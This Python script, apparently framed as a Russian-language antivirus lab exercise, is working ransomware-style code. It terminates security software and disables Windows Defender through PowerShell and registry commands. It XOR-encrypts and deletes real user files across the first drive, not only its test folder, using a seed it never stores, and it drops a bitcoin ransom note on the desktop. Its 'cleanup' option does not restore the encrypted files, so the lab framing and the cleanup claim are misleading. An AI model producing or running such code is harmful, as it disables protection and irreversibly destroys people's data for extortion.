import os
import sys
import random
import hashlib
from pathlib import Path
import subprocess
import json
import time
import shutil

LAB_CONFIG = {
    "target_files": ['.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', '.txt'],
    "skip_folders": ['Windows', 'Program Files', 'Program Files (x86)', 'System32'],
    "max_file_count": 5,
    "test_folder": "Лабораторные_файлы"
}

def terminate_security_software():
    print("[Лаб] Завершение процессов защитного ПО...")
    
    security_processes = [
        "msmpeng.exe", "msmpsvc.exe", "securityhealthservice.exe",
        "smartscreen.exe", "avp.exe", "avastsvc.exe", "ekrn.exe"
    ]
    
    terminated_count = 0
    
    if sys.platform == "win32":
        print("  [Система] Используем taskkill для завершения процессов...")
        
        for proc in security_processes:
            try:
                result = subprocess.run(
                    ["taskkill", "/F", "/IM", proc, "/T"],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if result.returncode == 0 or "завершен" in result.stdout:
                    print(f"  [✓] Завершен: {proc}")
                    terminated_count += 1
                else:
                    print(f"  [!] Не удалось завершить: {proc}")
                    
            except Exception as e:
                print(f"  [!] Ошибка с {proc}: {e}")
    
    print(f"[Лаб] Всего завершено процессов: {terminated_count}")
    return terminated_count

def modify_security_settings():
    if sys.platform != "win32":
        return False
    
    print("[Лаб] Изменение настроек безопасности...")
    
    defender_commands = [
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"'
    ]
    
    executed = 0
    for cmd in defender_commands:
        try:
            print(f"  [Выполнение] {cmd[:50]}...")
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                print(f"  [✓] Успешно: {cmd.split()[0]}")
                executed += 1
            else:
                print(f"  [!] Ошибка: {result.stderr[:100]}")
                
        except Exception as e:
            print(f"  [!] Исключение: {e}")
    
    return executed > 0

def generate_lab_files():
    lab_dir = Path(LAB_CONFIG["test_folder"])
    lab_dir.mkdir(exist_ok=True)
    
    print(f"[Лаб] Создание файлов в {lab_dir}")
    
    created_files = []

    file_templates = [
        ("важный_документ.txt", "Конфиденциальные данные\nФинансовый отчет\nПароли и доступы\n" * 20),
        ("отчет_компании.doc", "КОММЕРЧЕСКАЯ ТАЙНА\nДоговора и контракты\nПерсональные данные клиентов\n" * 15),
        ("финансы.xlsx", "Бухгалтерские данные\nЗарплатные ведомости\nБанковские реквизиты\n" * 10),
        ("фото_архив.jpg", "FAKE_JPEG_DATA" + "SECRET" * 200),
        ("техническая_документация.pdf", "%PDF-1.4\n1 0 obj\n<<\n/Title (Секретная документация)\n>>\nendobj\n")
    ]
    
    for filename, content in file_templates:
        file_path = lab_dir / filename
        try:
            if filename.endswith('.jpg'):
                file_path.write_bytes(content.encode('utf-8'))
            else:
                file_path.write_text(content, encoding='utf-8')
            
            created_files.append(file_path)
            print(f"  Создан: {filename} ({file_path.stat().st_size} байт)")
            
        except Exception as e:
            print(f"  Ошибка создания {filename}: {e}")
    
    print(f"[Лаб] Всего создано файлов: {len(created_files)}")
    return lab_dir, created_files

def simple_file_processor(data, seed_value):
    random.seed(seed_value)
    key_sequence = [random.randint(0, 255) for _ in range(256)]
    
    result = bytearray()
    for i, byte in enumerate(data):
        key_byte = key_sequence[i % len(key_sequence)]
        result.append(byte ^ key_byte)
    
    return bytes(result)

def encrypt_system_files():
    print("[Лаб] Поиск файлов в системных папках...")
    
    processed_count = 0
    seed = int(time.time())  # Динамический seed
    
    drives = []
    if sys.platform == "win32":
        import string
        drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    
    target_extensions = LAB_CONFIG["target_files"]
    skip_folders = LAB_CONFIG["skip_folders"]
    
    for drive in drives[:1]:  # Только первый диск
        for root, dirs, files in os.walk(drive, topdown=True):
            # Пропускаем системные папки
            dirs[:] = [d for d in dirs if d not in skip_folders]
            
            for file in files:
                if any(file.endswith(ext) for ext in target_extensions):
                    file_path = Path(root) / file
                    
                    try:
                        file_size = file_path.stat().st_size
                        if file_size > 10_000_000:  # Пропускаем большие файлы
                            continue
                            
                        print(f"  Найден: {file_path} ({file_size} байт)")
                        
                        with open(file_path, 'rb') as f:
                            original_content = f.read()
                        
                        encrypted_content = simple_file_processor(original_content, seed)
                        
                        encrypted_path = file_path.with_suffix(file_path.suffix + '.encrypted')
                        with open(encrypted_path, 'wb') as f:
                            f.write(encrypted_content)
                        
                        # Удаляем оригинальный файл
                        os.remove(file_path)
                        
                        processed_count += 1
                        print(f"    [✓] Зашифрован и удален оригинал")
                        
                        if processed_count >= LAB_CONFIG["max_file_count"]:
                            print(f"[Лаб] Достигнут лимит ({LAB_CONFIG['max_file_count']} файлов)")
                            return processed_count
                            
                    except Exception as e:
                        print(f"    [!] Ошибка: {e}")
                        continue
    
    print(f"[Лаб] Всего зашифровано файлов: {processed_count}")
    return processed_count

def create_ransom_note(target_dir):
    note_content = f"""
    ⚠️ ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ ⚠️
    
    Все ваши документы, фото и файлы были зашифрованы.
    
    Чтобы восстановить файлы:
    1. Отправьте $500 на Bitcoin кошелек: 1ABC123...
    2. Отправьте proof оплаты на email: recovery@mail.com
    3. Вы получите ключ дешифровки
    
    ВНИМАНИЕ:
    - Не пытайтесь восстановить файлы самостоятельно
    - У вас есть 72 часа
    - После этого ключ будет удален
    
    Дата шифрования: {time.strftime("%Y-%m-%d %H:%M:%S")}
    """
    
    note_path = target_dir / "ВНИМАНИЕ_ВОССТАНОВЛЕНИЕ_ФАЙЛОВ.txt"
    note_path.write_text(note_content, encoding='utf-8')
    
    desktop_path = Path.home() / "Desktop" / "ВНИМАНИЕ_ВОССТАНОВЛЕНИЕ_ФАЙЛОВ.txt"
    if desktop_path.parent.exists():
        desktop_path.write_text(note_content, encoding='utf-8')
    
    print(f"[Лаб] Файл с инструкциями создан: {note_path}")
    return note_path

def cleanup_test_files():
    print("[Лаб] Очистка тестовых файлов...")
    
    if Path(LAB_CONFIG["test_folder"]).exists():
        try:
            shutil.rmtree(LAB_CONFIG["test_folder"])
            print(f"[Лаб] Папка {LAB_CONFIG['test_folder']} удалена")
        except Exception as e:
            print(f"[Лаб] Ошибка очистки: {e}")
    
    # Удаляем ransom note с рабочего стола
    desktop_note = Path.home() / "Desktop" / "ВНИМАНИЕ_ВОССТАНОВЛЕНИЕ_ФАЙЛОВ.txt"
    if desktop_note.exists():
        try:
            desktop_note.unlink()
            print("[Лаб] Файл с рабочего стола удален")
        except:
            pass

def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "--cleanup":
            cleanup_test_files()
            return
        elif sys.argv[1] == "--help":
            print("Использование:")
            print("  python lab_work.py           - выполнение лабораторной работы")
            print("  python lab_work.py --cleanup - очистка тестовых файлов")
            print("  python lab_work.py --help    - эта справка")
            return
    
    print("=" * 70)
    print("ЛАБОРАТОРНАЯ РАБОТА №7: АНТИВИРУСНЫЕ СРЕДСТВА")
    print("=" * 70)
    print("ВНИМАНИЕ: Этот код демонстрирует реальные действия вредоносного ПО!")
    print("Запускайте ТОЛЬКО в изолированной виртуальной машине!")
    print("=" * 70)
    
    response = input("ВНИМАНИЕ! Файлы будут зашифрованы. Продолжить? (да/НЕТ): ")
    if response.lower() not in ['да', 'yes', 'y', 'д']:
        print("[Лаб] Отмена")
        return
    
    print("\n" + "=" * 70)
    print("ЭТАП 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ")
    print("=" * 70)
    terminated = terminate_security_software()
    if sys.platform == "win32":
        modify_security_settings()
    
    print("\n" + "=" * 70)
    print("ЭТАП 2: ПОДГОТОВКА ТЕСТОВЫХ ФАЙЛОВ")
    print("=" * 70)
    lab_directory, files = generate_lab_files()
    
    print("\n" + "=" * 70)
    print("ЭТАП 3: ШИФРОВАНИЕ ФАЙЛОВ")
    print("=" * 70)
    processed = encrypt_system_files()
    
    print("\n" + "=" * 70)
    print("ЭТАП 4: СОЗДАНИЕ ИНСТРУКЦИЙ")
    print("=" * 70)
    ransom_note = create_ransom_note(lab_directory)
    
    print("\n" + "=" * 70)
    print("ВЫПОЛНЕНИЕ ЗАВЕРШЕНО")
    print("=" * 70)
    print(f"1. Процессов завершено: {terminated}")
    print(f"2. Файлов зашифровано: {processed}")
    print(f"3. Инструкции созданы в: {ransom_note}")
    print(f"\n⚠️  ВНИМАНИЕ: Файлы зашифрованы!")
    print("   Для восстановления используйте очистку: python lab_work.py --cleanup")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[Лаб] Прервано пользователем")
    except Exception as e:
        print(f"\n[Лаб] Ошибка: {e}")
    
    input("\nНажмите Enter для выхода...")